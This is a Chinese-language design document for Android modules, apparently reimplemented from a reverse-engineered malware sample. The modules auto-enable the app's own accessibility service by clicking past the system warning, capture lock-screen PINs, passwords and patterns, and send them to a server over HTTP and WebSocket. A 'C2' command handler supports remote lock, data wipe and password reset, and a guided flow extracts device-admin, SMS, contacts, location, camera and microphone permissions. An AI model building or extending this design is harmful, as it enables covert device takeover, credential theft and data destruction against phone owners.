# 无障碍模块扩展文档 (模块 2-5)

> **版本**: 1.0
> **更新日期**: 2026-03-17
> **状态**: 已实现

---

## 模块 2: 无障碍服务自动开启引擎

### 概述

`AccessibilityServiceEngine` 通过无障碍服务自身的能力，在系统设置中自动找到并开启自身的无障碍服务权限。这是整个自动化系统的前置条件 — 只有无障碍服务启用后，其他引擎才能工作。

### 文件

| 文件 | 行数 | 说明 |
|------|------|------|
| `auto/engine/AccessibilityServiceEngine.java` | 280 | 自动开启引擎 |

### 执行流程

```
execute()
    │
    ├── 检查服务是否已运行 → 是 → finish()
    │
    ├── 厂商限制预检
    │   ├── 小米: 受限设置检测
    │   └── 华为: 纯净模式检测
    │
    └── 打开 ACTION_ACCESSIBILITY_SETTINGS
        │
        ▼
    监听 AccessibilitySettings 界面
        │
        ▼
    handleAccessibilityListPage()
        ├── 查找服务名称 (支持滚动查找)
        └── 点击进入详情
            │
            ▼
    handleServiceDetailPage()
        ├── 查找 Switch / ToggleButton
        └── 点击开启
            │
            ▼
    handleWarningDialog()
        ├── "此服务可能会收集您输入的所有内容..."
        └── 查找 "允许"/"确定"/"OK"/"Allow" → 点击
            │
            ▼
    无障碍服务已启用 ✅
```

### 厂商特殊处理

| 厂商 | 限制 | 处理方式 |
|------|------|----------|
| 小米 | 受限设置 | 检测 "受限设置" 文本，通过 VendorRestrictionListener 回调引导用户手动操作 |
| 华为 | 纯净模式 | 无法自动关闭，通过回调引导用户: 设置 → 系统和更新 → 纯净模式 → 退出 |

### 窗口匹配

使用 `contains` 匹配兼容不同厂商:
- `AccessibilitySettings` — 无障碍设置主界面
- `ToggleAccessibilityService` — 服务详情页
- `AlertDialog` — 警告确认对话框

---

## 模块 3: 锁屏密码监控

### 概述

`LockScreenMonitor` 是被动监听引擎，通过 `TYPE_VIEW_TEXT_CHANGED` 事件捕获用户在锁屏界面输入的 PIN/密码/图案，并通过回调上报。

### 文件

| 文件 | 行数 | 说明 |
|------|------|------|
| `auto/engine/LockScreenMonitor.java` | 310 | 锁屏密码监控引擎 |

### 逆向对照

| 本项目 | 逆向原始类 | 说明 |
|--------|-----------|------|
| `LockScreenMonitor` | `o/h.java` (196行) | PIN/密码/图案监听 |
| `autoClickVivoConfirm()` | `o/i.java` J() (266行) | vivo 确认按钮自动点击 |

### 监听的事件类型

| 事件 | 常量值 | 用途 |
|------|--------|------|
| TYPE_VIEW_TEXT_CHANGED | 16 | 捕获 PIN/密码输入 |
| TYPE_VIEW_TEXT_SELECTION_CHANGED | 8192 | 辅助密码捕获 |
| TYPE_WINDOW_STATE_CHANGED | 32 | 检测密码确认界面 |
| TYPE_WINDOW_CONTENT_CHANGED | 16384 | 图案锁内容变化 |

### 监听的包名

| 包名 | 说明 |
|------|------|
| `com.android.systemui` | 锁屏界面 |
| `com.android.settings` | 密码确认界面 |
| `com.samsung.android.biometrics.app.setting` | 三星生物识别 |

### 密码确认界面 (基于逆向 o/i.java)

```
com.android.settings.password.ConfirmLockPassword
com.android.settings.password.ConfirmLockPattern
com.android.settings.password.ChooseLockGeneric
com.vivo.settings.password.ConfirmVivoPin$InternalActivity
com.android.settings.password.ConfirmLockPattern$InternalActivity
```

### vivo 确认按钮 ID (4种尝试)

| 控件 ID | 类型 | 说明 |
|---------|------|------|
| `:id/mix_confirm` | View | 混合确认 |
| `:id/iv_complete` | TextView | 完成按钮 |
| `:id/vivo_pin_confirm` | Button | PIN 确认 (最常用) |
| `:id/mix_normal_confirm` | TextView | 普通确认 |

### 图案锁适配

| 厂商 | 控件 ID | 说明 |
|------|---------|------|
| 标准 | `:id/lockPattern` | 原生 Android 图案锁 |
| OPPO | `:id/biometric_lockPattern` | OPPO 特殊图案锁 |

### 密码类型

| 类型 | 常量 | 捕获方式 |
|------|------|----------|
| PIN | `LOCK_TYPE_PIN` | EditText.text (纯数字) |
| 密码 | `LOCK_TYPE_PASSWORD` | EditText.text (含字母) |
| 图案 | `LOCK_TYPE_PATTERN` | lockPattern 控件检测 |

---

## 模块 4: WebSocket 指令处理器

### 概述

`CommandHandler` 将无障碍模块接入 C2 通信系统，实现远程控制引擎、设备操作和状态上报。

### 文件

| 文件 | 行数 | 说明 |
|------|------|------|
| `service/CommandHandler.java` | 290 | 指令处理器 |

### 支持的指令

| 指令 | 参数 | 说明 |
|------|------|------|
| `start_engine` | `engine`: 引擎名称 | 启动指定引擎 |
| `stop_engine` | `engine`: 引擎名称 | 停止指定引擎 |
| `lock_screen` | 无 | 远程锁屏 |
| `wipe_data` | 无 | 远程擦除数据 |
| `reset_password` | `password`: 新密码 | 远程重置密码 |
| `get_status` | 无 | 获取完整状态报告 |
| `start_permission_flow` | 无 | 启动权限引导流程 |
| `start_all_engines` | 无 | 启动所有引擎 |

### 指令格式

```json
// 请求
{ "cmd": "start_engine", "engine": "xiaomi" }
{ "cmd": "lock_screen" }
{ "cmd": "get_status" }

// 响应
{ "type": 3, "status": "ok", "message": "Engine started: xiaomi", "timestamp": 1710000000 }
```

### WebSocket 消息类型

| type | 说明 |
|------|------|
| 0 | REGISTER (设备注册) |
| 1 | STATUS (状态上报) |
| 2 | PASSWORD_REPORT (密码上报) |
| 3 | COMMAND_RESPONSE (指令响应) |

### 密码上报

当 `LockScreenMonitor` 捕获到密码时，`CommandHandler` 同时通过两个通道上报:

1. HTTP POST → `/api/cipher/postLockCipher.json`
2. WebSocket 实时推送 (type=2)

```json
{
  "deviceId": "xxx",
  "lockType": "PIN",
  "lockValue": "1234",
  "timestamp": 1710000000
}
```

### 状态报告结构

```json
{
  "deviceId": "xxx",
  "vendor": "Xiaomi",
  "vendorId": 0,
  "brand": "Xiaomi",
  "timestamp": 1710000000,
  "accessibilityServiceRunning": true,
  "deviceAdminActive": true,
  "engines": {
    "DeviceAdminEngine": { "running": false, "finished": true },
    "XiaomiEngine": { "running": true, "finished": false },
    "LockScreenMonitor": { "running": true, "finished": false }
  },
  "engineCount": 5
}
```

---

## 模块 5: 权限引导 UI

### 概述

`PermissionActivity` 是透明 Activity，逐步引导用户授予所有必要权限。采用状态机模式，每个步骤检查权限是否已授予，未授予则引导开启。

### 文件

| 文件 | 行数 | 说明 |
|------|------|------|
| `activity/PermissionActivity.java` | 220 | 权限引导 Activity |

### 权限引导顺序

```
Step 0: 无障碍服务
    ├── 小米: 显示受限设置引导
    ├── 华为: 显示纯净模式引导
    └── 其他: 直接打开无障碍设置
        │
Step 1: 设备管理员
    └── PermissionHelper.requestDeviceAdmin()
        │
Step 2: 悬浮窗权限
    └── PermissionHelper.requestOverlayPermission()
        │
Step 3: 电池优化白名单
    └── PermissionHelper.requestIgnoreBatteryOptimization()
        │
Step 4: 运行时权限 (批量请求)
    ├── READ_SMS / RECEIVE_SMS / SEND_SMS
    ├── READ_PHONE_STATE / READ_CALL_LOG / CALL_PHONE
    ├── READ_CONTACTS
    ├── ACCESS_FINE_LOCATION / ACCESS_COARSE_LOCATION
    ├── CAMERA / RECORD_AUDIO
    └── READ_EXTERNAL_STORAGE
        │
Step 5: 完成 → finish()
```

### 厂商引导对话框

在请求无障碍服务前，针对特定厂商显示引导:

- 小米: "如果遇到[受限设置]提示..." + 操作步骤
- 华为: "如果无法开启无障碍服务，请先关闭纯净模式..." + 操作步骤

### 状态机设计

Activity 使用 `currentStep` 状态变量控制流程。每次 `onResume()` 时调用 `processNextStep()`，这样用户从设置页面返回后会自动继续下一步。

---

## 整体架构关系

```
PermissionActivity (权限引导 UI)
    │
    │ 引导用户授予权限
    ▼
MyAccessibilityService (无障碍服务)
    │
    │ onCreate() → EngineManager.registerVendorEngines()
    ▼
EngineManager (引擎管理器)
    │
    ├── AccessibilityServiceEngine  ← 自动开启无障碍
    ├── DeviceAdminEngine           ← 自动激活设备管理员
    ├── LockScreenMonitor           ← 密码监控 (被动)
    ├── XiaomiEngine / HuaweiEngine / ...  ← 厂商适配
    │
    │ dispatchEvent()
    ▼
CommandHandler (C2 指令处理)
    │
    ├── WebSocketClient ← 接收远程指令
    ├── HttpClient      ← 上报密码/状态
    └── EngineManager   ← 远程控制引擎
```
